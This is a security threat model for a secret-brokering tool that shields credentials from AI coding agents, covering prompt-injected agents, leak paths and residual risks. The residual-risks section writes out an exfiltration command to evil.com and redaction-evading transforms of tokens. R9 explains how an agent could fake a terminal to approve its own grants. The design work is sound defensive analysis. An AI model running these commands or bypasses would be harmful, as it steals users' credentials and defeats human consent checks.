# Threat model

## Assets

| Asset | Why it matters |
| --- | --- |
| A1. Secret values | Direct credential compromise. |
| A2. The master key | Compromises every value at once. |
| A3. Secret names, descriptions, layers, project roots and scopes | Low-sensitivity metadata, but enables targeted requests and maps which repositories hold which credentials. Encrypted at rest except names in the audit log. |
| A4. The grant store | Widening a grant silently = using a secret without consent. |
| A5. The audit log | Integrity is what lets the user trust "nothing happened that I did not approve". |
| A6. Agent config files touched by `init` | A bad write can lock the user out of their agent or weaken Gentle AI's deny list. |

## Trust boundaries

```
┌─────────────────────────── user's machine ───────────────────────────┐
│                                                                      │
│  ┌─ model boundary (untrusted) ─────────────────────────────────┐    │
│  │  LLM provider  ←→  host agent process (Pi / Claude Code / …) │    │
│  │                     tool calls, tool results, transcript     │    │
│  └──────────────────────────────────────────────────────────────┘    │
│                 │ MCP / CLI (names, refs, redacted output only)      │
│  ┌──────────────▼───────────────────────────────────────────────┐    │
│  │  gentle-vault runtime (trusted): broker, exec, redact, prompt│    │
│  │        │ keychain API        │ child process env             │    │
│  │   OS keychain          the one command that needs the value  │    │
│  │   vault.enc (0600)                                           │    │
│  └──────────────────────────────────────────────────────────────┘    │
│   user's terminal / native dialog (trusted input channel)            │
└──────────────────────────────────────────────────────────────────────┘
```

The whole design is the single rule: **nothing above the model boundary ever holds A1.**

## Attackers

- **T1. Prompt-injected agent.** Content the agent reads (a README, an issue, a web page, a dependency's error message) instructs it to exfiltrate credentials. The model is cooperative but not malicious; it will do what the text says if the tools allow it. This is the primary attacker.
- **T2. Curious or buggy agent.** No injection; the model simply does `echo $TOKEN` to "check it is set", or writes it into a `.env` "for convenience", or logs it.
- **T3. Transcript consumers.** The provider, session files on disk, shared session exports, screenshots, the gentle-ai review/RDD pipeline that re-reads transcripts.
- **T4. Local malware or another user on a shared machine** with access to the home directory but not the user's keychain session.
- **T5. Supply chain.** A tampered binary, extension or npm package.

## Out of scope

- Root/administrator on the machine, kernel compromise, a debugger attached to the user's own processes.
- A compromised OS keychain or an unlocked session left open to a physical attacker.
- The command the user *approved* doing something bad with the credential (e.g. `gh` itself being malicious). gentle-vault bounds *which* process gets the value, not what that process does. Binary allowlists narrow the blast radius; they do not eliminate it.
- Secrets leaking through the *network behavior* of the approved command in v1 (`hosts` is advisory). v2 may add an egress proxy.

## Leak paths and controls

| # | Leak path | Attacker | Control(s) | Req |
| --- | --- | --- | --- | --- |
| L1 | User types the value into the chat | T2 (user), T3 | Capture is out of band (masked TUI / native dialog); paste interception rewrites secret-shaped input to a reference before the model sees it | R-CAP-01, R-CAP-06 |
| L2 | Tool returns the value in its result | T1, T2 | Tools return names/refs only; `secret_request` never returns the value; existence is not disclosed pre-consent | R-API-02 |
| L3 | Command prints the value (`echo $T`, `curl -v`, stack trace with headers, `env`) | T1, T2 | Dump-command refusal list; streaming redaction of stdout/stderr incl. base64/url/JSON encodings | R-EXEC-03, R-RED-01 |
| L4 | Value written to disk by the agent (`.env`, config, log) | T1, T2 | Write/edit hook blocks literal values and rewrites to `{{secret:NAME}}`; Gentle AI deny list keeps `.env*` unreadable anyway | R-RED-04, host hooks |
| L5 | Value read back from a file the agent reads (`cat .env`, a log) | T1, T2 | Read results pass through the redactor while a grant is active; vault dir is on the deny list | R-RED-04, R-INS-05 |
| L6 | Value inherited by other processes (parent shell, subagents, background servers) | T1 | Per-child injection only; parent env scrubbed of same-named vars; subagents get no grant inheritance | R-EXEC-01, R-GRANT-05 |
| L7 | Agent asks for a secret it does not need, or loops asking | T1 | Reason shown to the user; rate limit on refused requests; audit of every request | R-CAP-02, R-CAP-05, R-AUD-01 |
| L8 | Grant widened without consent (e.g. MCP call "grant me project scope") | T1 | Grants only from host UI/native prompt; MCP surface cannot create grants; `sensitive` secrets accept `once` only | R-GRANT-03, R-GRANT-02 |
| L9 | Vault file, grants file or backups read or copied from disk (stolen backup, synced folder, leaked directory) | T4 | AEAD encryption of values, names, project roots and grants; key in keychain, never in the directory; 0600; no plaintext derivatives. See `STORAGE.md` § What a leaked directory reveals | R-VAULT-01..03, R-VAULT-07, R-VAULT-09 |
| L10 | Key file read from disk (no keychain) | T4 | Argon2id-wrapped with user passphrase; memory-hard parameters, authenticated as AAD and bounds-checked before Argon2 runs, so they cannot be weakened or inflated by editing the file | R-VAULT-02 |
| L11 | Audit log tampered to hide use | T1 (via commands), T4 | Hash chain; `audit --verify`; log is append-only and 0600 | R-AUD-02 |
| L12 | Tampered binary/extension | T5 | Minisign-signed checksums; npm provenance; checksum embedded in launcher; no postinstall; pinned versions | R-NFR-03 |
| L13 | `init` weakens the agent's deny list or breaks config | bug | Snapshot + atomic merge; explicit check that Gentle AI deny list entries survive; `doctor` verifies | R-INS-04, R-INS-05 |
| L14 | Value in crash output / panic / debug logs of gentle-vault itself | bug | Values are held in a `Secret` type whose `String()`/`Format()`/`MarshalJSON` return `[REDACTED]`; `recover()` wrappers redact; leak tests grep every output | AGENTS.md invariant 1 |
| L15 | Value in shell history | T2 | Values are never passed as CLI arguments; `set` reads from the masked prompt or stdin only | CLI.md |
| L16 | Clipboard | T2 | gentle-vault never writes the clipboard; capture does not offer "copy" | R-VAULT-07 |
| L17 | Agent uses `secret_manage` to weaken the vault (remove a secret so the user re-types it, clear `sensitive`, empty `binaries`, move a secret to a layer with a broader grant) | T1 | Every action needs a user confirmation with a broker-issued prompt token; widening edits are labeled in the prompt; `move`/`replace` drop grants; `manage` never creates a grant; per-name cooldown on declines; audited | R-API-07, R-API-08, R-LAYER-05 |
| L18 | Agent reaches another repository's secrets (e.g. `cd ../other && …`, or a crafted `cwd`) | T1 | Model-facing ops only say `project`, never a path; the broker resolves the layer from the envelope `cwd` set by the host, not by the model; `project`-scope grants are bound to the root; `list` never shows other projects | R-LAYER-01, R-API-03 |
| L19 | A project override silently inherits a broader global grant | T1, bug | Grants bind to (name, layer, record id); a new override, a re-created secret or a replaced value starts with no grant, even if a grant drop failed | R-GRANT-01, D13 |
| L20 | `grants.enc` rolled back (an older copy restored) or deleted to revive a revoked grant | T4 | Grants are AEAD-sealed with their own write counter in `state.json`; a file behind the counter, or one that fails authentication, is treated as empty (fail closed), never as the old grants, and the CLI audits `warning: grants reset`; deleting the file only removes permissions. The counter itself is unauthenticated (R8) | R-GRANT-04, R-GRANT-06 |

## Residual risks (accepted in v1)

- **R1. The approved command exfiltrates.** If the user grants `GITHUB_TOKEN` to `curl` and the agent runs `curl -d "$GITHUB_TOKEN" evil.com`, redaction hides it from the transcript but the request still leaves. Mitigation: binary allowlists (`gh`, not `curl`), `hosts` warnings, the reason string the user sees. Fix in v2: egress proxy / network namespace for exec children.
  - **A granted command can transform and print the value.** Any program that holds the value may hex-encode it, upper-case it, insert spaces between characters, print only a prefix or a suffix, reverse it, or write it to a file the agent reads later (`gh auth token | xxd -p`, `printf '%s' "$T" | tr a-z A-Z`, `echo ${T:0:5}`, `cp /proc/self/environ out.txt`). Redaction (R2) does not see those forms, and the dump-command guard only refuses the well-known patterns. Both are **best-effort layers** that catch the common and the accidental case; they do not make an approved command safe. The boundary is what the user approves (the grant, the binary allowlist, the reason string), not these filters. The guard's coverage of shells other than sh/bash is weaker (`--shell cmd|pwsh` with an allowlist accepts only one simple command, see CLI.md).
- **R2. Redaction is pattern-based and best-effort.** A value transformed in a way we do not model escapes: hex, upper- or lower-casing, characters separated by spaces, partial prefixes or suffixes, a value written to a file and read back, or any transformation a granted command chooses to apply (see R1). *Modeled today* (`internal/redact`): raw; the value with matching surrounding quotes stripped; base64 standard and URL-safe, padded and unpadded; percent-encoding (query, path, strict, Python `urllib.parse.quote` and JavaScript `encodeURIComponent` flavors, upper and lower hex); JSON string bodies (with and without HTML escaping, with and without ASCII-only `\uXXXX` escaping, either hex case, with and without `\/` slash escaping); for values of 8 bytes or more, the stable inner base64 substring at each of the three byte alignments, so a value inside a larger base64 blob (HTTP Basic `base64(user:token)`) is found; and for multi-line values, the whole value with the other line-ending convention (LF to CRLF or back) plus each line whose trimmed length is at least 16 bytes as its own raw pattern, so a PEM key or service-account JSON printed line by line is redacted. Matching is leftmost-longest and works across chunk boundaries. *Not modeled*: line-wrapped base64 (MIME/PEM 64 or 76 columns), hex, reversed or ROT13 text, other encodings (HTML entities, base32, gzip), a value split across separate outputs or tool calls, inner base64 for values under 8 bytes, encodings derived from an already transformed value (for example base64 of its percent-encoding), and chained overlap of two different secrets that share bytes (the leftmost match consumes the shared bytes and the rest of the second secret survives). Derived patterns shorter than 4 bytes are dropped; values under 8 bytes are still redacted raw but warned about (R3). The per-line rule has a 16-byte threshold: shorter lines (a lone `}`, `-----`) are never patterns, because they would match unrelated text constantly, so a multi-line secret whose lines are all shorter than that is only caught as a whole. Mitigation: encodings list is extensible; dump commands refused; the model has no incentive absent injection. Monitor and extend.
- **R3. Short or low-entropy values** cause false positives in redaction or weak protection. Warned at capture time.
- **R4. Native dialog spoofing.** A malicious command could pop its own "gentle-vault" dialog. Mitigation: the real prompt names the session and shows the reason; Pi/Gentle Shell inline prompt is rendered by the trusted extension, not by a child process. Accept for v1.
- **R6. Names in the audit log.** `audit.jsonl` stays cleartext so it can be verified while the vault is locked; a leaked copy reveals secret names, layers and redacted commands, never values. Keyed-hash names are a v2 candidate.
- **R7. Host-controlled `cwd`.** A host shell tool whose working directory the model can change (`cd` inside one bash call) could resolve a different project layer for that exec. The bash override and hooks compute `cwd` after parsing leading `cd` segments and the first-use-per-session confirmation names the project. Accepted for v1.
- **R8. `state.json` and `audit.head` are not authenticated.** A local attacker who can write `$GENTLE_VAULT_HOME` can lower the rollback counter and hide a rollback of `vault.enc`, and can rewrite `audit.jsonl` and `audit.head` together (recomputing every hash) so `audit --verify` still passes; `audit.head` only catches accidental truncation and naive deletion of the log's tail. Out of scope with T4 (local malware with write access to the user's files); file permissions are the only defense.
- **R9a. Unwipable environment strings.** `exec` hands values to the child as environment strings; Go's `os/exec` needs `string`s, so those copies cannot be zeroed after the run. Accepted, like the GC note in STORAGE.md; the child process itself holds the value for its lifetime regardless.
- **R9. The agent can run the CLI itself.** `grant`, `set --grant`, `revoke`, `set`, `rm --yes`, `mv`, `edit` and `relink` are ordinary commands. An agent that can run commands in its own shell can invoke them, and can even fake a terminal with a pseudo-terminal (`script`, `expect`) to answer the `[y/N]` question of `grant` itself. The y/N question on a terminal is a convenience for the human at the keyboard, not a boundary against an agent with shell access; the **prompt token** is the strong boundary (random, single use, bound to one request, issued only to the broker's own prompt backend). Closed by moving CLI confirmation to the native out-of-band dialog (slice 1.10) and by host hooks that refuse `gentle-vault` mutating subcommands in the agent's shell (phase 3). Of these, `relink` and `revoke` can only narrow access (`relink` drops the grants of the old layer and carries none over). `exec` run from the agent's own shell is not a bypass: it still needs a grant, goes through the dump guard and allowlist, and redacts its output; but the agent could pick the command it runs under an existing grant, which is R1. Until then a user who runs an agent with an unrestricted shell on the same account must treat grants as advisory.
- **R5. Headless Linux with passphrase** means the passphrase is asked on each unlock (cached for the session with a TTL). Usability cost, not a security gap.

## Security review checklist for PRs

- [ ] Does any new code path produce output that could include a `Secret`? Does it go through `redact`?
- [ ] Does any new CLI flag accept a value positionally (shell history)?
- [ ] Does any new host adapter write a file without `filemerge` snapshot + atomic rename?
- [ ] Does the change add a way to create or widen a grant that is not a user interaction?
- [ ] Does the change add a way to mutate the vault (`manage`, `mv`, `rm`, `edit`) that does not require a user confirmation?
- [ ] Can any model-supplied field select a project other than the one of the host-supplied `cwd`?
- [ ] Is the leak test extended?
